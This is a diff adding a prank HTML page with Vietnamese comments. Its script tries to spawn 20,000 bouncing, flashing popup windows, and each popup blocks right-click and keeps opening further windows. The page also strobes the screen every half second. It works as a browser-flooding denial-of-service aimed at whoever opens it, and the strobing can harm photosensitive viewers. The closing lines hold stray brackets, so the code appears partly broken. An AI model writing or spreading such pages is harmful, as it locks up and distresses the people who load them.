@@ -1,0 +1,368 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>whyyousaywindow:D</title>
+
+<style>
+html, body {
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+
+    background: #000;
+    color: #fff;
+
+    animation: flash 0.5s steps(1) infinite;
+}
+
+@keyframes flash {
+    0% {
+        background: #000;
+        color: #fff;
+    }
+
+    50% {
+        background: #fff;
+        color: #000;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<h1 style="
+    position:fixed;
+    left:50%;
+    top:50%;
+    transform:translate(-50%,-50%);
+    font-family:Arial;
+">
+    :)
+</h1>
+
+<script>
+
+const WINDOW_COUNT = 20000;
+
+const trollWindows = [];
+
+
+// ================================
+// TẠO CỬA SỔ
+// ================================
+
+function createTrollWindow(id) {
+
+    const width = 180;
+    const height = 120;
+
+
+    let x =
+        Math.random() *
+        Math.max(1, screen.availWidth - width);
+
+    let y =
+        Math.random() *
+        Math.max(1, screen.availHeight - height);
+
+
+    let vx =
+        (Math.random() * 10 + 8) *
+        (Math.random() < 0.5 ? -1 : 1);
+
+    let vy =
+        (Math.random() * 10 + 8) *
+        (Math.random() < 0.5 ? -1 : 1);
+
+
+    const win = window.open(
+        "",
+        "WHY_YOU_SAY_WINDOW_" + id,
+        `
+        width=${width},
+        height=${height},
+        left=${Math.round(x)},
+        top=${Math.round(y)},
+        resizable=no,
+        scrollbars=no,
+        toolbar=no,
+        menubar=no,
+        location=no,
+        status=no
+        `
+    );
+
+
+    if (!win) {
+        return;
+    }
+
+
+    trollWindows.push(win);
+
+
+    // ================================
+    // NỘI DUNG CỬA SỔ
+    // ================================
+
+    win.document.write(`
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta charset="UTF-8">
+
+<title>:)</title>
+
+<style>
+
+html,
+body {
+
+    margin: 0;
+
+    width: 100%;
+    height: 100%;
+
+    overflow: hidden;
+
+}
+
+body {
+
+    margin: 0;
+
+    background: #000;
+
+    animation:
+        blackWhite 1.5s steps(1) infinite;
+
+}
+
+@keyframes blackWhite {
+
+    0% {
+        background: #000;
+    }
+
+    50% {
+        background: #fff;
+    }
+
+}
+
+#face {
+
+    position: absolute;
+
+    left: 50%;
+    top: 50%;
+
+    transform:
+        translate(-50%, -50%);
+
+    font-family: Arial, sans-serif;
+
+    font-size: 55px;
+
+    font-weight: bold;
+
+    color: white;
+
+    user-select: none;
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="face">:D</div>
+
+
+<script>
+
+// ================================
+// CHUỘT PHẢI
+// ================================
+
+document.addEventListener(
+    "contextmenu",
+    function(event) {
+
+        event.preventDefault();
+
+        document.title = "XD";
+
+        const oldFace =
+            document.getElementById("face");
+
+        oldFace.textContent = ">:)";
+
+        setTimeout(() => {
+
+            document.title = ">XD";
+
+        }, 1000);
+
+    }
+);
+
+
+// ================================
+// KIỂM TRA TRANG GỐC
+// ================================
+
+setInterval(() => {
+
+    try {
+
+        if (
+            !window.opener ||
+            window.opener.close
+        ) {
+
+            window.open();
+
+        }
+
+    } catch (e) {
+
+        window.close();
+
+    }
+
+}, 300);
+
+<\/script>
+
+</body>
+
+</html>
+    `);
+
+    win.document.close();
+
+
+    // ================================
+    // DI CHUYỂN CẢ CỬA SỔ
+    // ================================
+
+    function moveWindow() {
+
+        if (win.opener) {
+            createTrollWindow(id);
+        }
+
+
+        x += vx;
+        y += vy;
+
+
+        const maxX =
+            Math.max(
+                0,
+                screen.availWidth - width
+            );
+
+        const maxY =
+            Math.max(
+                0,
+                screen.availHeight - height
+            );
+
+
+        if (x <= 0) {
+
+            x = 0;
+
+            vx = Math.abs(vx);
+
+        }
+
+
+        if (x >= maxX) {
+
+            x = maxX;
+
+            vx = -Math.abs(vx);
+
+        }
+
+
+        if (y <= 0) {
+
+            y = 0;
+
+            vy = Math.abs(vy);
+
+        }
+
+
+        if (y >= maxY) {
+
+            y = maxY;
+
+            vy = -Math.abs(vy);
+
+        }
+
+
+        try {
+
+            win.moveTo(
+                Math.round(x),
+                Math.round(y)
+            );
+
+        } catch (e) {
+
+            return;
+
+        }
+
+
+        requestAnimationFrame(moveWindow);
+
+    }
+
+
+    moveWindow();
+
+}
+
+
+// ================================
+// TỰ ĐỘNG MỞ 20000 CỬA SỔ
+// ================================
+
+for (
+    let i = 0;
+    i < WINDOW_COUNT;
+    i++
+) {
+
+    setTimeout(() => {
+
+        createTrollWindow(i);
+
+    }, i * 80);
+
+         }
+
+    }
+
+);
+
+</script>
+
+</body>
+</html>
